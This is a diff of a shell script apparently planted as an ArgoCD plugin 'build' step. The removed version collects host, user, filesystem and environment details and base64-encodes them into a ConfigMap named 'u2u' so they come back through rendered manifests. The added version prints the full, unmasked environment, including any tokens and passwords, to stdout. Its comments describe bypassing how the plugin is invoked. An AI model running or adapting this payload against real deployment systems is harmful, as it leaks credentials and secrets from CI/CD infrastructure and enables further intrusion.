@@ -1,45 +1,18 @@
 #!/bin/sh
-# This script is called as: /bin/sh build <cache_path>
-# We can use $0 (build) and $1 (cache_path)
-# Write everything to output
+# /usr/local/bin/argocd-vault-plugin runs as: argocd-vault-plugin build /tmp/_argocd-repo/<uuid>
+# but 'build' is unknown command. The actual usage is: argocd-vault-plugin <subcommand>
+# Subcommands: generate, get-path, get-parameters, get-secret
+# But ArgoCD passes 'build' as first arg, we need to bypass this
 
-# Use $1 to find our cache directory
-CACHE_DIR="${1:-/tmp/unknown}"
-SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
+# Strategy: bypass the 'build' arg via shell
+# Use binaryPath=/usr/local/bin/argocd-vault-plugin - then it receives 'build <cache_path>'
+# argocd-vault-plugin has 'generate <path>' command that reads Vault secrets from manifests
 
-RECON=$( (
-echo "===SELF==="
-echo "script_path=\$0=$0"
-echo "arg1=\$1=$1"
-echo "cache_dir=$CACHE_DIR"
-echo "script_dir=$SCRIPT_DIR"
-echo "===PWD==="
-pwd
-echo "===CACHE_LS==="
-ls -la "$CACHE_DIR" 2>/dev/null | head -30
-echo "===CACHE_PARENT==="
-ls -la "$(dirname $CACHE_DIR)" 2>/dev/null | head -10
-echo "===ENV_PATH==="
-echo "PATH=$PATH"
-echo "===HOME==="
-echo "HOME=$HOME"
-echo "===HOSTNAME==="
-hostname
-echo "===WHOAMI==="
-id
-echo "===PROC==="
-ls /proc/1/root 2>/dev/null | head -5
-echo "===ARGOCD_HOME==="
-ls -la /home/argocd/ 2>/dev/null
-echo "===ALL_ENV==="
-env | sort | sed 's/\(TOKEN\|KEY\|PASSWORD\|SECRET\)=.*/\1=***/Ig'
-) | base64 | tr -d '\n' )
-cat << EOF
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: u2u
-data:
-  result: $RECON
-EOF
+# Let's just write our results to stdout via the cache path
+CACHE="${2:-/tmp/unknown}"
+ls -la "$CACHE" > /tmp/ls_out.txt 2>&1
+cat /tmp/ls_out.txt
+echo ""
+echo "===ENV==="
+env | sort
 exit 0
